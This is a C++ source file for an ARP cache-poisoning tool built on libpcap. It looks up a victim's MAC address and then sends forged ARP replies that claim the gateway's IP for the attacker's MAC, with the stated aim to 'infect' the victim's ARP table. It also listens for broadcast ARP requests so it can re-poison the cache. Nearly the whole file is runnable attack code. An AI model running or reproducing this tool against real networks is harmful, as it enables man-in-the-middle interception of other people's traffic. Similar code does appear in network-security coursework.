#include "main.h"

void sendArp(int mode, pcap_t *handle, Mac ether_dmac, Mac ether_smac, 
			 Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = ether_dmac;
	packet.eth_.smac_ = ether_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);

	packet.arp_.op_ = htons(mode);

	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.smac_ = Mac(arp_smac);
	packet.arp_.sip_ = htonl(Ip(arp_sip));
	packet.arp_.tmac_ = Mac(arp_tmac);
	packet.arp_.tip_ = htonl(Ip(arp_tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	else
	{
		printf("\n\n------------------------------\n");
		printf("Arp packet sending succeeded!");
		printf("\n------------------------------\n\n");
	}
}

EthArpPacket* receiveArp(int mode, pcap_t* handle, Ip src_ip, Ip dst_ip)
{
	while (true)
		{
			struct pcap_pkthdr *header;
			const u_char *arp_packet;
			int result = pcap_next_ex(handle, &header, &arp_packet);
			if (result != 1)
			{
				continue;
			}
			EthArpPacket *arp = (EthArpPacket *)arp_packet;

			if (ntohs(arp->eth_.type_) == EthHdr::Arp && ntohs(arp->arp_.op_) == mode &&
				arp->arp_.sip_ == Ip(htonl(src_ip)) && arp->arp_.tip_ == Ip(htonl(dst_ip)))
			{
				printf("\n\n------------------------------\n");
				printf("Arp Packet captured..\n");
				printf("from %s...\n", std::string(src_ip).data());
				printf("to %s...", std::string(dst_ip).data());
				printf("\n------------------------------\n\n\n");
				return arp;
			}
		}
}

void getSenderMac(pcap_t* handle, Mac src_mac, Ip src_ip, char* dst_mac, Ip arp_tip)
{
	sendArp(ArpHdr::Request, handle, Mac("ff:ff:ff:ff:ff:ff"), Mac(src_mac),
		 Mac(src_mac), Ip(src_ip), Mac("00:00:00:00:00:00"), Ip(arp_tip));
	
	strcpy(dst_mac,std::string(receiveArp(ArpHdr::Reply, handle, Ip(arp_tip), Ip(src_ip))->arp_.smac_).c_str());
	return;
}

int reinfect(pcap_t* handle, char* send_ip, char* tar_ip)
{
	// printf("dmac: %s\n",std::string(receiveArp(ArpHdr::Request, handle, Ip(send_ip), Ip(tar_ip))->eth_.dmac_).c_str());
	if ( strcmp(std::string(receiveArp(ArpHdr::Request, handle, Ip(send_ip), Ip(tar_ip))->eth_.dmac_).c_str(),"FF:FF:FF:FF:FF:FF") == 0)
	{
		return 1;
	}
	return 0;
}

int main(int argc, char *argv[])
{
	// parameter check
	if (argc < 4 || (argc % 2) != 0)
	{
		usage();
		return -1;
	}
	// for multiple execution
	int iter;
	for (iter = 2; iter <= argc-1; iter += 2)
	{
		printf("Get host info..\n\n");
		char *dev = argv[1];
		const char *interfaceName = argv[1];
		// Collecting info for ARP packet
		unsigned char att_mac[6];
		if (getHostMac(interfaceName, att_mac) == 0)
		{
			printf("attacker MAC : %02X:%02X:%02X:%02X:%02X:%02X\n",
					att_mac[0], att_mac[1], att_mac[2],
					att_mac[3], att_mac[4], att_mac[5]);
		}
		else
		{
			printf("Failed to get MAC Address.\n");
		}

		char att_ip[INET_ADDRSTRLEN];
		if (getHostIp(interfaceName, att_ip) == 0)
		{
			printf("attacker IP : %s\n",att_ip);
		}
		else
		{
			printf("Failed to get IP address.\n");
		}

		// Open pcap handle
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr)
		{
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}

		// Send ARP Request packet for dst_mac(victim MAC address)
		char send_mac[ETH_ALEN];
		char* send_ip = argv[iter];
		char* tar_ip = argv[iter+1];
		getSenderMac(handle, Mac(att_mac), Ip(att_ip), send_mac ,Ip(send_ip));

		printf("sender MAC : %s\n", send_mac);
		printf("sender IP : %s\n", send_ip);

		// Send ARP Reply packet to infect victim(sender)'s ARP table
		sendArp(ArpHdr::Reply, handle, Mac(send_mac), Mac(send_mac), Mac(att_mac), Ip(tar_ip), Mac(send_mac), Ip(send_ip));


		// Case #1 : sender broadcasts arp request packet (to get gateway's mac)
		// if( reinfect(handle, send_ip, tar_ip) == 1 )
		// {
		// 	sendArp(ArpHdr::Reply, handle, Mac(send_mac), Mac(send_mac), Mac(att_mac), Ip(tar_ip), Mac(send_mac), Ip(send_ip));
		// }
		// Case #2 : gateway broadcasts arp request packet (to get sender's mac)
		if ( reinfect(handle, tar_ip, send_ip) == 1)
		{
			sendArp(ArpHdr::Reply, handle, Mac(send_mac), Mac(send_mac), Mac(att_mac), Ip(tar_ip), Mac(send_mac), Ip(send_ip));
		}
		// Case #3 : gateway broadcasts arp request (to get david(other one)'s mac)
		// reinfect(handle, tar_ip, );


		pcap_close(handle);
	}
}
